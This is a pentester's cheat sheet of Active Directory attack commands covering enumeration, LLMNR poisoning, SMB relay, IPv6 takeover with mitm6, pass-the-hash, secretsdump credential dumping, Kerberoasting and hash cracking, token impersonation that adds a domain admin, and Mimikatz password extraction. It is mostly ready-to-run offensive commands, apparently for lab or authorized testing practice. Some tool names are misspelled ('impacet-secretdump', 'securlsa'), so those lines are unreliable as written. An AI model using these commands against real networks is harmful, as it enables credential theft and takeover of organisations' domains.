# AD handy commands

- Network mapping
    
    ```bash
    # Find all alive hosts
    fping -agq <network>
    
    # Enumerate smb shares
    smbclient / smbmap / enum4linux
    
    # We can test if anonymous LDAP bind is enabled with ldapsearch
    ldapsearch -x -H ldap://<ip> -s base
    
    # Username enumeration:
    ldapsearch -x -H ldap://<ip> -b "dc=tryhackme,dc=loc" "(objectClass=person)"
    enum4linux-ng -A <ip> -oA results.txt
    rpcclient -U "" 10.211.11.10 -N    -> enumdomusers
    for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
    ./kerbrute userenum -d <domain> users.txt --dc <ip>
    
    # Know target's password policy
    rpcclient -U "" <ip> -N  -> getdompwinfo
    crackmapexec smb <ip> --pass-pol
    
    # Check for if any nfs share is present to export
    showmount -e <ip>
    ```
    
- Initial attack vectors
    - LLMNR
        
        ```bash
        #Run responder and for any event on client side
        sudo responder -I eth0 -dwv
        ```
        
    - SMB relay
        
        ```bash
        1. find host with that functionality:
        nmap --script=smb2-security-mode.nse -p445 <ip range>
        # Only works when message signing enabled but not required
        # Now configure /etc/responder/Responder4.conf file and switch off smb and http
        2. Run responder
        sudo responder -I eth0 -dwv
        3. Setup relay
        ntlmrelayx.py -tf <target-file> -smb2support (can also try with -i and -c flags)
        4. Any event occur on client side
        5. You will get sam hashes or shell
        ```
        
    - Gaining shell
        
        ```bash
        1. Msfconsole:
        		# You can use windows/smb/psexec module and can gain shell with pass and hashes
        2. Psexec/smbexec/wmiexec:
        		impacket-psexec 'Domain/user:Password9@<ip>'
        		psexec.py <user-name>@<target-ip> -hashes <hash>
        3. RDP:
        		xfreerdp3 /v:[ip_address] /u:[username] /p:[password] /dynamic-resolution /cert:ignore
        ```
        
    - Ipv6 takeover
        
        ```bash
        1. Setup ntlmrelayx for ipv6
        ntlmrelayx.py -6 -t ldaps://<domain-ip> -wh fakewpad.<domain-name> -l lootme
        2. Start mitm6
        sudo mitm -d <domain-name>
        3. If target reebot or log on to machine you will get a user account created as domain user.
        4. Now you can try to enumerate your domain peacefully.
        ```
        
- Domain Enumeration
    - ldapdomaindump
        
        ```bash
        1. Make a directory where you want domain information to save
        2. Run ldapdomaindump
        sudo /usr/bin/ldapdomaindump ldaps://<domain-ip> -u '<domain\user>' -p <pass>
        ```
        
    - bloodhound
        
        ```bash
        1. Start neo4j:
        	sudo neo4j console
        2. Start bloodhound:
        	sudo bloodhound
        3. Capture domain information:
        	sudo bloodhound-python -d <domain-name> -u <user-name> -p <pass> -ns <domain-ip> -c all
        4. Now import those captured files on bloodhound and start enumerating domain.
        ```
        
    - Plumhound
        
        ```bash
        Note: Bloodhound must be on and in being process to run plumhound
        It's directory is /opt/Plumhound
        1. Run Plumhound:
        	python3 Plumhound.py -x tasks/default.tasks -p neo4j1
        2. Enumerate captured files
        ```
        
- Domain Attacks
    - Pass attacks
        
        ```bash
        # Crackmapexec
        	1. Pass the pass:
        	crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
        	2. Pass the hash:
        	crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth # administrator's cred works well and can also use flags: --sam --lsa -M lsassy
        	3. Explore captured creds via cmedb
        	
        # Secretsdump.py
        	1. For password
        	sudo impacket-secretsdump LANKA.local/<user>:<pass>@<target-ip>
        	2. For hashes
        	sudo impacet-secretdump <user>:@<target-ip> -hashes <hashes>
        ```
        
    - Kerberoasting
        
        ```bash
        1. Request hash from dc:
        	GetUserSPNs.py LANKA.local/<user>:<pass> -dc-ip <dc-ip> -request
        2. Crack those hash with hashcat:
        	sudo hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
        	
        	------------------------------------------------------------------------------------------------------------
        	# If you are within a shell
        	$ Add-Type -AssemblyName System.IdentityModel
        	$ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN-name>"
        	
        	# Now export kerberos tickets with mimikatz
        	kerberos::list /exports
        	# Find ticket with the name of your service from you forged ticket
        	# Get that hash on your machine and extract that hash with kirbi2john
        	
        ```
        
    - Token impersonation
        
        ```bash
        1. Pop a shell via msfconsole and check tokens:
        	use windows/smb/psexec
        	# after meterpreter shell opened:
        	load incognito
        	list_tokens -u
        	# check if domain users token's were there, If yes then on to next step
        2. Impersonate that token
        	impersonate_token LANKA\\Administrator
        	shell
        	# Now check it with whoami if done than on to next step
        3. Attempt to add a new user as domain admin
        	net user /add username password /domain
        	net group "Domain Admins" username /add /domain
        4. Now dump hashes via that account with sectetsdump.py
        ```
        
    - Mimikatz
        
        ```bash
        Try to download mimikatz on target computer and run it
        1. Give it privilege
        	privilege::debug
        2. Try to find stored creds on machine 
        	securlsa::logonpasswords
        3. Enumerate heavily
        ```
